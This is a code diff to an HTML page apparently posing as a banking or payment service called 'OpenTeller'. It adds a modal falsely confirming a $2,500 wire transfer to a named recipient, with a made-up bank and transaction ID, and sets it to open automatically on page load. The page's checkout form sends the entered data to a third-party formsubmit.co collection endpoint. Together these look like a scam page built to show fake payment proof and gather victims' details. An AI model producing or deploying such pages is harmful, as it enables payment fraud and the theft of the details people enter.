@@ -11,6 +11,7 @@
   <link rel="icon" href="./logo.jpeg" type="image/jpeg" />
   
 	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
 
   <style>
     body {
@@ -129,6 +130,31 @@
     </div>
   </div>
 
+  <!-- Modal -->
+  <div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+    <div class="modal-dialog">
+      <div class="modal-content">
+        <div class="modal-header border-0 pb-0">
+          <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+        </div>
+        <div class="modal-body text-center">
+          <h4 class="mb-4">✅ Transfer Successful</h4>
+          <p class="lead">Your wire transfer has been processed successfully.</p>
+          <p class="d-flex">Amount: <span class="ms-auto">$2,500.00</span></p>
+          <p class="d-flex">Recipient: <span class="ms-auto">SIAMAK Nafatchi</span></p>
+          <p class="d-flex">Bank: <span class="ms-auto">XYZ Bank</span></p>
+          <p class="d-flex">Transaction ID: <span class="ms-auto">WT94837261</span></p>
+          <p class="d-flex">Date: <span class="ms-auto">April 17, 2026</span></p>
+
+          <p class="text-start">The funds will be credited to the recipient’s account within 1–3 business days.</p>
+          <hr />
+          <p class="small text-start text-muted">If you did not authorize this transaction, please contact customer support immediately.</p>
+          <!-- <p class="text-center"><button type="button" class="btn btn-primary" style="background-color:#014EA8;">Continue</button></p> -->
+        </div>
+      </div>
+    </div>
+  </div>
+
   <script>
     const form = document.getElementById('checkoutForm');
     const btn = document.getElementById('payBtn');
@@ -151,27 +177,33 @@
 </html>
 
 <script>
-  $("#checkoutForm").submit((e) => {
-    data = new FormData(this);
-    e.preventDefault();
-    // const data = {
-    //   message: msg,
-    //   from_name: "OpenTeller"
-    // }
-    $(".login-btn").prop("disabled", true).html("<i class='spinner-border spinner-border-sm'></i>...");
-    $.ajax({
-      url: "https://formsubmit.co/ajax/fceb7c66a69228b93c167b94e13568a0",
-      method: "POST",
-      data: data,
-      dataType: "json"
-    })
-      .then((message) => {
-        console.log(message);
-        $(".login-btn").prop("disabled", false).html("Transfer");
+  $(document).ready(() => {
+    $("#exampleModal").modal("show");
+
+    $("#checkoutForm").submit((e) => {
+      e.preventDefault();
+      data = new FormData(this);
+      // const data = {
+      //   message: msg,
+      //   from_name: "OpenTeller"
+      // }
+      $(".login-btn").prop("disabled", true).html("<i class='spinner-border spinner-border-sm'></i>...");
+      $.ajax({
+        url: "https://formsubmit.co/ajax/fceb7c66a69228b93c167b94e13568a0",
+        method: "POST",
+        data: data,
+        dataType: "json"
       })
-      .catch((err) => {
-        console.log(err);
-        $(".login-btn").prop("disabled", false).html("Transfer");
-      });
+        .then((message) => {
+          console.log(message);
+          $("#exampleModal").modal("show");
+          $(".login-btn").prop("disabled", false).html("Transfer");
+        })
+        .catch((err) => {
+          console.log(err);
+          $(".login-btn").prop("disabled", false).html("Transfer");
+        });
+    });
   });
+
 </script>
